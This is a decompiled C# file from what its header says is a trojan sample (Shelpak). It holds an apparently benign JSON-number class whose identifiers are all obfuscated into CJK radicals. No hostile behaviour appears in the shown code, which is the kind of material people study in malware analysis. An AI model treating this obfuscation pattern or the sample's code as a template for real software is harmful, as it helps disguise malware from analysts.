// Decompiled with JetBrains decompiler
// Type: 羊屮女瓦比冂馬止艸手.歹勹黹牛龍水彐无手臣麥冫
// Assembly: correcthit, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 98A8C508-DCA7-4494-BD18-281291040E34
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Shelpak.gen-d9c811eae2b07eca77f74ca45e1efee2a2c91add3f8606c489f526eb43f55287.exe

using System;
using System.Globalization;
using System.Text;

namespace 羊屮女瓦比冂馬止艸手
{
  public class 歹勹黹牛龍水彐无手臣麥冫 : 牛刀火刀鼠匕士用幺黑手鼻
  {
    private double 冖玉工毛色二心广毋黃木厂;

    public virtual 頁金广牛爪彡羽匚鬥巾八 羽冫禾龠牛入虍鼓斤辵 => 頁金广牛爪彡羽匚鬥巾八.曰竹辛气殳厂氏辛矢几;

    public virtual bool 木十金匕十黃夂戶囗鹿疋山 => true;

    public override 牛刀火刀鼠匕士用幺黑手鼻.襾大耳豸谷臼手爻至毋虍邑冖 GetEnumerator() => new 牛刀火刀鼠匕士用幺黑手鼻.襾大耳豸谷臼手爻至毋虍邑冖();

    public virtual string 广麻水网牙曰日文方生卩疒戶冂
    {
      get => this.冖玉工毛色二心广毋黃木厂.ToString((IFormatProvider) CultureInfo.InvariantCulture);
      set
      {
        double result;
        if (!double.TryParse(value, NumberStyles.Float, (IFormatProvider) CultureInfo.InvariantCulture, out result))
          return;
        this.冖玉工毛色二心广毋黃木厂 = result;
      }
    }

    public virtual double 支鬲丿人干辵酉己寸彡口日酉士木
    {
      get => this.冖玉工毛色二心广毋黃木厂;
      set => this.冖玉工毛色二心广毋黃木厂 = value;
    }

    public virtual long 赤廾長人士十靑彐尢角鹵
    {
      get => (long) this.冖玉工毛色二心广毋黃木厂;
      set => this.冖玉工毛色二心广毋黃木厂 = (double) value;
    }

    public 歹勹黹牛龍水彐无手臣麥冫(double 臼止夕厶毛支革日寸而革皿) => this.冖玉工毛色二心广毋黃木厂 = 臼止夕厶毛支革日寸而革皿;

    public 歹勹黹牛龍水彐无手臣麥冫(string 攴夊己匸乙比文羽舟身广皿) => this.父彳目夂网儿立石厂耒欠犬 = 攴夊己匸乙比文羽舟身广皿;

    public override 牛刀火刀鼠匕士用幺黑手鼻 Clone() => (牛刀火刀鼠匕士用幺黑手鼻) new 歹勹黹牛龍水彐无手臣麥冫(this.冖玉工毛色二心广毋黃木厂);

    internal override void WriteToStringBuilder(
      StringBuilder 气彡犬方靑冫木色比匚方,
      int 囗彡卩黑身邑厶口亠鬲几非甘韭示,
      int 己水土匕衣戈廾廴高攴,
      長釆儿丿幺斤艸干爿人玉龍手 曰龠水皿戈欠疋皮气禾鬲匕匸女示)
    {
      气彡犬方靑冫木色比匚方.Append(this.父彳目夂网儿立石厂耒欠犬);
    }

    private static bool 水厂水爿欠舛犬肉一儿鹿(object 止囗魚鼓父入斤斤夕魚毋匕犬飛衣糸)
    {
      switch (止囗魚鼓父入斤斤夕魚毋匕犬飛衣糸)
      {
        case int _:
        case uint _:
        case float _:
        case double _:
        case Decimal _:
        case long _:
        case ulong _:
        case short _:
        case ushort _:
        case sbyte _:
          return true;
        default:
          return 止囗魚鼓父入斤斤夕魚毋匕犬飛衣糸 is byte;
      }
    }

    public override bool Equals(object 皿目鼠隶舌阜矛十雨文)
    {
      if (皿目鼠隶舌阜矛十雨文 == null)
        return false;
      if (base.Equals(皿目鼠隶舌阜矛十雨文))
        return true;
      歹勹黹牛龍水彐无手臣麥冫 歹勹黹牛龍水彐无手臣麥冫 = 皿目鼠隶舌阜矛十雨文 as 歹勹黹牛龍水彐无手臣麥冫;
      if ((牛刀火刀鼠匕士用幺黑手鼻) 歹勹黹牛龍水彐无手臣麥冫 != (object) null)
        return this.冖玉工毛色二心广毋黃木厂 == 歹勹黹牛龍水彐无手臣麥冫.冖玉工毛色二心广毋黃木厂;
      return 歹勹黹牛龍水彐无手臣麥冫.水厂水爿欠舛犬肉一儿鹿(皿目鼠隶舌阜矛十雨文) && Convert.ToDouble(皿目鼠隶舌阜矛十雨文) == this.冖玉工毛色二心广毋黃木厂;
    }

    public override int GetHashCode() => this.冖玉工毛色二心广毋黃木厂.GetHashCode();
  }
}
